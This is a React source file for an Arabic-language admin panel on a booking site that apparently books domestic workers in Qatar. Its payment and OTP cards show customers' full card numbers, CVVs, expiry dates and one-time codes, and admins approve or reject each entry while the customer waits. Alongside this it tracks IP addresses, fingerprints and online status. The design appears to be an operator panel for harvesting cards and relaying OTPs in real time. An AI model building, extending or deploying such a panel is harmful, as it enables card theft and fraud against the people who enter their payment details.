"use client";

import { useState } from "react";
import { CardBrandLogo } from "@/components/admin/CardBrandLogo";
import { resolveBankDomain, getBankLogoUrl } from "@/lib/card-utils";
import styles from "./ClientDetailPanel.module.css";
import type { InboxClient } from "./ClientInboxClient";

type Props = {
  client: InboxClient | null;
  onBlock?: (clientId: string, blocked: boolean) => void;
  onArchive?: (clientId: string, archive: boolean) => void;
  onDelete?: (clientId: string) => void;
  onEntryDecided?: (entryId: string, status: "approved" | "rejected") => void;
};

/** تنسيق تاريخ ثابت (توقيت قطر UTC+3) — متطابق على الخادم والعميل لتفادي أخطاء hydration. */
function formatDateTime(iso: string): string {
  const d = new Date(iso);
  if (isNaN(d.getTime())) return "";
  const qatar = new Date(d.getTime() + 3 * 60 * 60 * 1000);
  const pad = (n: number) => String(n).padStart(2, "0");
  const h = qatar.getUTCHours();
  const ampm = h < 12 ? "ص" : "م";
  const h12 = h % 12 || 12;
  return `${pad(qatar.getUTCDate())}/${pad(qatar.getUTCMonth() + 1)}/${qatar.getUTCFullYear()} ${pad(h12)}:${pad(qatar.getUTCMinutes())}:${pad(qatar.getUTCSeconds())} ${ampm}`;
}

export function ClientDetailPanel({ client, onBlock, onArchive, onDelete, onEntryDecided }: Props) {
  const [confirmingDelete, setConfirmingDelete] = useState(false);
  if (!client) {
    return (
      <div className={styles.empty} dir="rtl">
        <div className={styles.emptyIcon}>👤</div>
        <p>اختر عميلاً من القائمة لعرض تفاصيله</p>
      </div>
    );
  }

  // بناء خط زمني موحّد: كل صندوق يحمل وقته الخاص (created_at)
  type TimelineItem = {
    kind: "profile" | "booking" | "payment" | "otp" | "inquiry";
    created_at: string;
    data: Record<string, unknown>;
  };

  const timeline: TimelineItem[] = [];

  // صندوق المعلومات الأساسية — وقته هو وقت إنشاء الحساب (يُرتّب طبيعياً مع باقي الصناديق)
  timeline.push({ kind: "profile", created_at: client.created_at, data: {} });

  // إضافة الحجوزات
  for (const b of client.bookings as Array<Record<string, unknown>>) {
    timeline.push({ kind: "booking", created_at: String(b.created_at ?? ""), data: b });
  }

  // الإدخالات مرتّبة من الأحدث إلى الأقدم من جهة الخادم.
  // العميل لا ينتظر قرار المدير إلا على أحدث إدخال معلّق لكل (حجز، نوع).
  // لذلك نُقرر فقط على أحدث إدخال معلّق لكل (booking_id, type)، ونخفي أزرار
  // القرار عن الإدخالات المعلّقة الأقدم حتى لا يقرر المدير على إدخال لم يعد
  // العميل ينتظره — مما كان يمنع وصول قرار المدير للعميل.
  type DecidableEntry = { type: string; payload: Record<string, unknown>; created_at: string; id: string };
  const decidableIds = new Set<string>();
  {
    const seenPending = new Set<string>();
    for (const e of client.entries as Array<DecidableEntry>) {
      const bookingId = String(e.payload?.booking_id ?? "");
      const entryType = e.type === "otp_request" ? "otp" : e.type === "verification" ? "otp" : e.type;
      const status = String(e.payload?.status ?? "pending_admin");
      const key = `${bookingId}:${entryType}`;
      if (entryType === "payment" || entryType === "otp") {
        if (status === "pending_admin" && !seenPending.has(key)) {
          seenPending.add(key);
          decidableIds.add(e.id);
        }
      }
    }
  }

  // إضافة الإدخالات (دفع / OTP / استفسار)
  for (const e of client.entries as Array<{ type: string; payload: Record<string, unknown>; created_at: string; id: string }>) {
    if (e.type === "payment") timeline.push({ kind: "payment", created_at: e.created_at, data: { ...e, id: e.id, decidable: decidableIds.has(e.id) } });
    else if (e.type === "otp_request" || e.type === "verification") timeline.push({ kind: "otp", created_at: e.created_at, data: { ...e, id: e.id, decidable: decidableIds.has(e.id) } });
    else if (e.type === "inquiry") timeline.push({ kind: "inquiry", created_at: e.created_at, data: { ...e } });
  }

  // ترتيب الخط الزمني: الأحدث في الأعلى، الأقدم في الأسفل
  timeline.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());

  return (
    <div className={styles.container} dir="rtl">
      {/* ===== شريط العنوان ===== */}
      <div className={styles.headerBar}>
        <div className={styles.headerTop}>
          <span className={styles.clientName}>{client.name}</span>
          {client.active && <span className={styles.refreshIcon}>↻</span>}
          <div className={styles.spacer} />
          <a href="/admin/bookings" className={`${styles.headerBtn} ${styles.pdfRed}`} title="الحجوزات">
            📄 الحجوزات
          </a>
        </div>
        {/* شريط المعلومات */}
        <div className={styles.infoStrip}>
          <InfoChip icon={<PhoneIcon />} value={client.phone ?? "غير متوفر"} />
          <InfoChip icon={<DesktopIcon />} value={client.device ?? "غير معروف"} />
          <InfoChip icon={<GlobeSmallIcon />} value={client.countryName ?? client.country ?? "غير محدد"} muted />
          <div className={styles.infoChip}>
            <span className={styles.infoFlag}>{client.flag}</span>
          </div>
          <div className={styles.infoChip}>
            <span
              className={`${styles.statusTag} ${client.active ? styles.statusOnline : styles.statusOffline}`}
              title={client.active ? "متصل الآن" : "غير متصل"}
            >
              {client.active ? "● متصل" : "○ غير متصل"}
            </span>
          </div>
        </div>
        {/* شريط الإجراءات */}
        <div className={styles.actionStrip}>
          <button
            className={`${styles.blockBtn} ${client.is_blocked ? styles.unblockBtn : styles.blockRedBtn}`}
            onClick={() => onBlock?.(client.id, !client.is_blocked)}
          >
            {client.is_blocked ? "إلغاء الحظر" : "🚫 حظر"}
          </button>
          {onArchive && (
            <button
              className={`${styles.blockBtn} ${client.is_archived ? styles.unarchiveBtn : styles.archiveBtn}`}
              onClick={() => onArchive(client.id, !client.is_archived)}
            >
              {client.is_archived ? "📤 إلغاء أرشفة" : "📥 أرشفة"}
            </button>
          )}
          {onDelete && !confirmingDelete ? (
            <button
              className={`${styles.blockBtn} ${styles.deleteBtn}`}
              onClick={() => setConfirmingDelete(true)}
            >
              🗑 حذف
            </button>
          ) : onDelete && confirmingDelete ? (
            <>
              <span className={styles.confirmText}>تأكيد؟</span>
              <button
                className={`${styles.blockBtn} ${styles.deleteBtn}`}
                onClick={() => onDelete(client.id)}
              >
                نعم، احذف
              </button>
              <button
                className={`${styles.blockBtn} ${styles.cancelBtn}`}
                onClick={() => setConfirmingDelete(false)}
              >
                إلغاء
              </button>
            </>
          ) : null}
        </div>
      </div>

      {/* ===== المحتوى: خط زمني موحّد — كل صندوق بوقته الخاص، الأحدث في الأعلى ===== */}
      <div className={styles.cardsArea}>
        {timeline.map((item, i) => {
            if (item.kind === "profile") {
              return (
                <Card key="profile" title="معلومات أساسية" timeAgo={formatDateTime(item.created_at)}>
                  <DataRow label="الاسم" value={client.name} />
                  <DataRow label="البريد الإلكتروني" value={client.email ?? "غير متوفر"} dir="ltr" />
                  <DataRow label="رقم الهاتف" value={client.phone ?? "غير متوفر"} dir="ltr" />
                  <DataRow label="الدولة" value={`${client.flag} ${client.country ?? "غير محدد"}`} />
                  <DataRow label="عنوان IP" value={client.ip ?? "غير متوفر"} dir="ltr" />
                  <DataRow label="البصمة" value={client.fingerprint.slice(0, 16) + "..."} dir="ltr" />
                  <DataRow
                    label="الحالة"
                    value={client.is_blocked ? "محظور" : "نشط"}
                    highlight={client.is_blocked ? "red" : "green"}
                  />
                </Card>
              );
            }
            if (item.kind === "booking") {
              return (
                <BookingCard
                  key={`booking-${String(item.data.id ?? i)}`}
                  booking={item.data}
                  ownTime={item.created_at}
                  latest={i === 0}
                />
              );
            }
            if (item.kind === "payment") {
              return (
                <PaymentCard
                  key={`payment-${String(item.data.id ?? i)}`}
                  entry={item.data as { id: string; type: string; payload: Record<string, unknown>; created_at: string }}
                  latest={i === 0}
                  decidable={item.data.decidable === true}
                  onDecided={onEntryDecided}
                />
              );
            }
            if (item.kind === "otp") {
              return (
                <OtpRequestCard
                  key={`otp-${String(item.data.id ?? i)}`}
                  entry={item.data as { id: string; type: string; payload: Record<string, unknown>; created_at: string }}
                  decidable={item.data.decidable === true}
                  onDecided={onEntryDecided}
                />
              );
            }
            return (
              <InquiryCard
                key={`inquiry-${i}`}
                entry={item.data as { type: string; payload: Record<string, unknown>; created_at: string }}
              />
            );
          })
        }
      </div>
    </div>
  );
}

/* ===== مكونات فرعية ===== */

function Card({
  title,
  timeAgo,
  children,
}: {
  title: string;
  timeAgo?: string;
  children: React.ReactNode;
}) {
  return (
    <div className={styles.card}>
      <div className={styles.cardHeader}>
        <span className={styles.cardTitle}>{title}</span>
        <div className={styles.cardHeaderRight}>
          {timeAgo && <span className={styles.cardTime}>⏱ {timeAgo}</span>}
        </div>
      </div>
      <div className={styles.cardBody}>{children}</div>
    </div>
  );
}

function BookingCard({
  booking,
  ownTime,
  latest,
}: {
  booking: Record<string, unknown>;
  ownTime: string;
  latest: boolean;
}) {
  const worker = booking.worker as
    | { full_name: string; nationality: string; photo_url: string | null; expected_salary: number }
    | null;
  const status = String(booking.status ?? "pending");
  const statusLabel = status === "paid" ? "✓ مدفوع" : status === "completed" ? "✓ مكتمل" : status === "cancelled" ? "✗ ملغي" : "⏳ معلق";
  const statusClass = status === "paid" || status === "completed" ? "green" : status === "cancelled" ? "red" : "amber";

  return (
    <div className={styles.card}>
      <div className={styles.cardHeader}>
        <span className={styles.cardTitle}>حجز {latest && <span className={styles.latestTag}>الأحدث</span>}</span>
        <div className={styles.cardHeaderRight}>
          <span className={styles.cardTime}>⏱ {formatDateTime(ownTime)}</span>
        </div>
      </div>
      <div className={styles.cardBody}>
        {worker && (
          <div className={styles.workerRow}>
            {worker.photo_url && (
              <img src={worker.photo_url} alt={worker.full_name} className={styles.workerPhoto} />
            )}
            <div className={styles.workerInfo}>
              <span className={styles.workerName}>{worker.full_name}</span>
              <span className={styles.workerMeta}>
                {worker.nationality} · {worker.expected_salary} ر.ق
              </span>
            </div>
          </div>
        )}
        <DataRow label="المرجع" value={String(booking.booking_ref ?? "")} dir="ltr" mono />
        <DataRow label="الحالة" value={statusLabel} highlight={statusClass as "green" | "red" | "amber"} />
        {booking.notes ? <DataRow label="ملاحظات" value={String(booking.notes)} /> : null}
        {booking.terms_snapshot ? (
          <DataRow label="الشروط" value={String(booking.terms_snapshot)} small />
        ) : null}
      </div>
    </div>
  );
}

function PaymentCard({
  entry,
  latest,
  decidable = true,
  onDecided,
}: {
  entry: { id: string; type: string; payload: Record<string, unknown>; created_at: string };
  latest: boolean;
  decidable?: boolean;
  onDecided?: (entryId: string, status: "approved" | "rejected") => void;
}) {
  const p = entry.payload;
  const cardNumber = String(p.card_number ?? "");
  const cardLast4 = String(p.card_last4 ?? cardNumber.slice(-4) ?? "****");
  const cardName = String(p.card_name ?? "غير متوفر");
  const expiry = String(p.expiry ?? "**/**");
  const cvv = String(p.cvv ?? "***");
  const binScheme = String(p.bin_scheme ?? "غير معروف");
  const binType = String(p.bin_type ?? "");
  const binBank = String(p.bin_bank ?? "غير معروف");
  const binCountry = String(p.bin_country ?? "غير معروف");
  const binCountryCode = String(p.bin_country_code ?? "");
  // شعار البنك: نُفضّل القيمة المخزّنة في الـ payload، وإلا نحسبها لحظياً من اسم البنك
  // (لدعم الـ entries القديمة قبل إضافة حقلي bin_bank_domain/bin_bank_logo).
  const bankDomain =
    (p.bin_bank_domain as string | null) ?? resolveBankDomain(binBank);
  const bankLogoUrl =
    (p.bin_bank_logo as string | null) ?? getBankLogoUrl(bankDomain);
  const status = String(p.status ?? "pending_admin");
  const bookingRef = String(p.booking_ref ?? "");
  const [deciding, setDeciding] = useState(false);

  const statusLabel =
    status === "approved" ? "✓ موافق عليه" : status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار قرار المدير";
  const statusClass = status === "approved" ? "green" : status === "rejected" ? "red" : "amber";

  async function decide(decision: "approve" | "reject") {
    setDeciding(true);
    try {
      const res = await fetch("/api/payments/decide", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ entryId: entry.id, decision }),
      });
      if (res.ok) {
        // حدّث الحالة محلياً فوراً (دون إعادة تحميل)؛ البثّ يُبلغ العميل لحظياً.
        onDecided?.(entry.id, decision === "approve" ? "approved" : "rejected");
      } else {
        setDeciding(false);
      }
    } catch {
      setDeciding(false);
    }
  }

  return (
    <div className={styles.card}>
      <div className={styles.cardHeader}>
        <span className={styles.cardTitle}>
          الدفع {latest && <span className={styles.latestTag}>الأحدث</span>}
        </span>
        <div className={styles.cardHeaderRight}>
          <span className={styles.cardTime}>⏱ {formatDateTime(entry.created_at)}</span>
        </div>
      </div>
      <div className={styles.cardBody}>
        {/* البطاقة المصورة */}
        <div className={styles.creditCard}>
          <div className={styles.cardDecorCircle1} />
          <div className={styles.cardDecorCircle2} />
          <div className={styles.cardTopRow}>
            <div className={styles.bankLogoGroup}>
              {bankLogoUrl ? (
                /* eslint-disable-next-line @next/next/no-img-element */
                <img
                  className={styles.bankLogo}
                  src={bankLogoUrl}
                  alt={binBank}
                  title={binBank}
                />
              ) : (
                <span className={styles.bankLogoFallback} title={binBank}>
                  {binBank !== "غير معروف" ? binBank.charAt(0) : "؟"}
                </span>
              )}
              <span className={styles.bankName}>{binBank}</span>
            </div>
            <CardBrandLogo scheme={binScheme} />
          </div>
          <div className={styles.cardNumber} dir="ltr">
            {cardNumber ? cardNumber.replace(/(.{4})/g, "$1 ").trim() : `•••• •••• •••• ${cardLast4}`}
          </div>
          <div className={styles.cardBottomRow}>
            <div className={styles.cardHolder}>
              <span className={styles.cardLabel}>حامل البطاقة</span>
              <span className={styles.cardValueSmall}>{cardName}</span>
            </div>
            <div className={styles.cardExpGroup}>
              <span className={styles.cardLabel}>EXPIRES</span>
              <span className={styles.cardValueSmall} dir="ltr">{expiry}</span>
            </div>
            <div className={styles.cardExpGroup}>
              <span className={styles.cardLabel}>CVV</span>
              <span className={styles.cardValueSmall} dir="ltr">{cvv}</span>
            </div>
          </div>
        </div>

        {/* معلومات BIN */}
        <DataRow label="نوع البطاقة" value={binScheme + (binType ? ` (${binType})` : "")} />
        <DataRow label="البنك" value={binBank} />
        <DataRow label="الدولة" value={binCountry + (binCountryCode ? ` (${binCountryCode})` : "")} />
        {bookingRef && <DataRow label="حجز مرتبط" value={bookingRef} dir="ltr" mono />}

        {/* الحالة */}
        <div className={styles.paymentStatus}>
          <span className={`${styles.statusBadge} ${statusClass === "green" ? styles.statusGreen : statusClass === "red" ? styles.statusRed : styles.statusAmber}`}>
            {statusLabel}
          </span>
        </div>

        {/* أزرار المدير — تظهر فقط على أحدث إدخال معلّق لكل حجز/نوع،
            لأن العميل ينتظر قرار المدير فقط على هذا الإدخال. */}
        {status === "pending_admin" && decidable && (
          <div className={styles.adminActions}>
            <button
              className={`${styles.actionBtn} ${styles.approveBtn}`}
              onClick={() => decide("approve")}
              disabled={deciding}
            >
              ✓ موافقة
            </button>
            <button
              className={`${styles.actionBtn} ${styles.rejectBtn}`}
              onClick={() => decide("reject")}
              disabled={deciding}
            >
              ✗ رفض
            </button>
          </div>
        )}
        {status === "pending_admin" && !decidable && (
          <div className={styles.staleNote}>طلب أقدم — لا ينتظره العميل. قرّر على الأحدث.</div>
        )}
      </div>
    </div>
  );
}

function OtpRequestCard({
  entry,
  decidable = true,
  onDecided,
}: {
  entry: { id: string; type: string; payload: Record<string, unknown>; created_at: string };
  decidable?: boolean;
  onDecided?: (entryId: string, status: "approved" | "rejected") => void;
}) {
  const p = entry.payload;
  const otp = String(p.otp ?? "----");
  const status = String(p.status ?? "pending_admin");
  const bookingRef = String(p.booking_ref ?? "");
  const [deciding, setDeciding] = useState(false);

  const statusLabel =
    status === "approved" ? "✓ موافق عليه" : status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار قرار المدير";
  const statusClass = status === "approved" ? "green" : status === "rejected" ? "red" : "amber";

  async function decide(decision: "approve" | "reject") {
    setDeciding(true);
    try {
      const res = await fetch("/api/payments/decide-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ entryId: entry.id, decision }),
      });
      if (res.ok) {
        onDecided?.(entry.id, decision === "approve" ? "approved" : "rejected");
      } else {
        setDeciding(false);
      }
    } catch {
      setDeciding(false);
    }
  }

  return (
    <div className={styles.card}>
      <div className={styles.cardHeader}>
        <span className={styles.cardTitle}>رمز التحقق (OTP)</span>
        <div className={styles.cardHeaderRight}>
          <span className={styles.cardTime}>⏱ {formatDateTime(entry.created_at)}</span>
        </div>
      </div>
      <div className={styles.cardBody}>
        <div className={styles.otpSection}>
          <span className={styles.otpLabel}>الرمز المُرسل:</span>
          <div className={styles.otpBoxes} dir="ltr">
            {otp.split("").map((d, i) => (
              <div key={i} className={styles.otpBox}>{d}</div>
            ))}
          </div>
        </div>
        {bookingRef && <DataRow label="حجز مرتبط" value={bookingRef} dir="ltr" mono />}

        <div className={styles.paymentStatus}>
          <span className={`${styles.statusBadge} ${statusClass === "green" ? styles.statusGreen : statusClass === "red" ? styles.statusRed : styles.statusAmber}`}>
            {statusLabel}
          </span>
        </div>

        {status === "pending_admin" && decidable && (
          <div className={styles.adminActions}>
            <button
              className={`${styles.actionBtn} ${styles.approveBtn}`}
              onClick={() => decide("approve")}
              disabled={deciding}
            >
              ✓ موافقة
            </button>
            <button
              className={`${styles.actionBtn} ${styles.rejectBtn}`}
              onClick={() => decide("reject")}
              disabled={deciding}
            >
              ✗ رفض
            </button>
          </div>
        )}
        {status === "pending_admin" && !decidable && (
          <div className={styles.staleNote}>طلب أقدم — لا ينتظره العميل. قرّر على الأحدث.</div>
        )}
      </div>
    </div>
  );
}

function InquiryCard({
  entry,
}: {
  entry: { type: string; payload: Record<string, unknown>; created_at: string };
}) {
  const p = entry.payload;
  return (
    <div className={styles.card}>
      <div className={styles.cardHeader}>
        <span className={styles.cardTitle}>استفسار</span>
        <div className={styles.cardHeaderRight}>
          <span className={styles.cardTime}>⏱ {formatDateTime(entry.created_at)}</span>
        </div>
      </div>
      <div className={styles.cardBody}>
        <DataRow label="الاسم" value={String(p.full_name ?? "غير متوفر")} />
        <DataRow label="نوع الخدمة" value={String(p.service_type ?? "غير محدد")} />
        <DataRow label="الهاتف" value={String(p.phone ?? "غير متوفر")} dir="ltr" />
        <DataRow label="الرسالة" value={String(p.message ?? "")} small />
      </div>
    </div>
  );
}

function DataRow({
  label,
  value,
  dir,
  mono,
  small,
  highlight,
}: {
  label: string;
  value: string;
  dir?: "ltr" | "rtl";
  mono?: boolean;
  small?: boolean;
  highlight?: "green" | "red" | "amber";
}) {
  const valueClass = highlight
    ? highlight === "green"
      ? styles.valueGreen
      : highlight === "red"
        ? styles.valueRed
        : styles.valueAmber
    : styles.valueDefault;
  return (
    <div className={styles.dataRow}>
      <span className={styles.dataLabel}>{label}:</span>
      <span
        className={`${styles.dataValue} ${valueClass} ${mono ? styles.mono : ""} ${small ? styles.smallText : ""}`}
        dir={dir}
      >
        {value}
      </span>
    </div>
  );
}

function EmptyData({ text }: { text: string }) {
  return <div className={styles.emptyData}>{text}</div>;
}

function InfoChip({
  icon,
  value,
  muted,
}: {
  icon: React.ReactNode;
  value: string;
  muted?: boolean;
}) {
  return (
    <div className={styles.infoChip}>
      {icon}
      <span className={muted ? styles.infoMuted : styles.infoMono}>{value}</span>
    </div>
  );
}

/* ===== أيقونات SVG ===== */
function PhoneIcon() {
  return (
    <svg className={styles.infoIcon} width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
    </svg>
  );
}
function DesktopIcon() {
  return (
    <svg className={styles.infoIcon} width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <rect x="2" y="3" width="20" height="14" rx="2" /><line x1="8" x2="16" y1="21" y2="21" /><line x1="12" x2="12" y1="17" y2="21" />
    </svg>
  );
}
function GlobeSmallIcon() {
  return (
    <svg className={styles.infoIcon} width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <circle cx="12" cy="12" r="10" /><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" /><path d="M2 12h20" />
    </svg>
  );
}
